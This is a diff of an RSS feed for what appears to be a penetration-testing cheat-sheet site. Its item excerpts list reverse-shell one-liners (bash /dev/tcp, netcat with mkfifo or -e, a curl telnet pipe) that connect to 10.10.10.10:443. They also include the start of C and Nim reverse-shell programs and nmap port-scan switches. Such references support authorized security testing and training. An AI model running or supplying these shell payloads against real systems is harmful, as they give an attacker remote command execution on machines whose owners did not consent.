@@ -1,1 +1,33 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>D0CUM3NTN4T10N</title><link>https://documentnation.github.io/</link><description>Recent content on D0CUM3NTN4T10N</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 02 Dec 2023 13:27:51 +0530</lastBuildDate><atom:link href="https://documentnation.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux</title><link>https://documentnation.github.io/docs/shells/linux/</link><pubDate>Sat, 02 Dec 2023 13:24:59 +0530</pubDate><guid>https://documentnation.github.io/docs/shells/linux/</guid><description>Reverse link Bash link sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 443 &amp;gt;/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C=&amp;#39;curl -Ns telnet://10.10.10.10:443&amp;#39;; $C &amp;lt;/dev/null 2&amp;gt;&amp;amp;1 | sh 2&amp;gt;&amp;amp;1 | $C &amp;gt;/dev/null C link #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;arpa/inet.h&amp;gt; int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.</description></item><item><title>Portscan</title><link>https://documentnation.github.io/docs/reconnaissance/portscan/</link><pubDate>Wed, 29 Nov 2023 09:58:38 +0530</pubDate><guid>https://documentnation.github.io/docs/reconnaissance/portscan/</guid><description>Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.</description></item><item><title>Windows</title><link>https://documentnation.github.io/docs/shells/windows/</link><pubDate>Sat, 02 Dec 2023 13:27:47 +0530</pubDate><guid>https://documentnation.github.io/docs/shells/windows/</guid><description>Reverse link Nim link proc exe(c: string): string = result = execProcess(&amp;#34;cm&amp;#34; &amp;amp; &amp;#34;d /c &amp;#34; &amp;amp; c) var v = newSocket() # Change this v1 = &amp;#34;10.10.10.10&amp;#34; v2 = &amp;#34;443&amp;#34; s4 = &amp;#34;Exiting..&amp;#34; s5 = &amp;#34;cd&amp;#34; s6 = &amp;#34;C:\\&amp;#34; try: v.connect(v1, Port(parseInt(v2))) while true: v.send(os.getCurrentDir() &amp;amp; &amp;#34;&amp;gt; &amp;#34;) let c = v.recvLine() if c == &amp;#34;exit&amp;#34;: v.send(s4) break if c.strip() == s5: os.setCurrentDir(s6) elif c.strip().startswith(s5): let d = c.</description></item><item><title>Web</title><link>https://documentnation.github.io/docs/shells/web/</link><pubDate>Sat, 02 Dec 2023 13:27:51 +0530</pubDate><guid>https://documentnation.github.io/docs/shells/web/</guid><description/></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/</link>
+    <description>Recent content on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sat, 02 Dec 2023 13:27:51 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Linux</title>
+      <link>https://documentnation.github.io/docs/shells/linux/</link>
+      <pubDate>Sat, 02 Dec 2023 13:24:59 +0530</pubDate>
+      <guid>https://documentnation.github.io/docs/shells/linux/</guid>
+      <description>Reverse link Bash link sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 443 &amp;gt;/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C=&amp;#39;curl -Ns telnet://10.10.10.10:443&amp;#39;; $C &amp;lt;/dev/null 2&amp;gt;&amp;amp;1 | sh 2&amp;gt;&amp;amp;1 | $C &amp;gt;/dev/null C link #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;arpa/inet.h&amp;gt; int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.</description>
+    </item>
+    <item>
+      <title>Portscan</title>
+      <link>https://documentnation.github.io/docs/reconnaissance/portscan/</link>
+      <pubDate>Wed, 29 Nov 2023 09:58:38 +0530</pubDate>
+      <guid>https://documentnation.github.io/docs/reconnaissance/portscan/</guid>
+      <description>Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.</description>
+    </item>
+    <item>
+      <title>Web</title>
+      <link>https://documentnation.github.io/docs/shells/web/</link>
+      <pubDate>Sat, 02 Dec 2023 13:27:51 +0530</pubDate>
+      <guid>https://documentnation.github.io/docs/shells/web/</guid>
+      <description></description>
+    </item>
+  </channel>
+</rss>
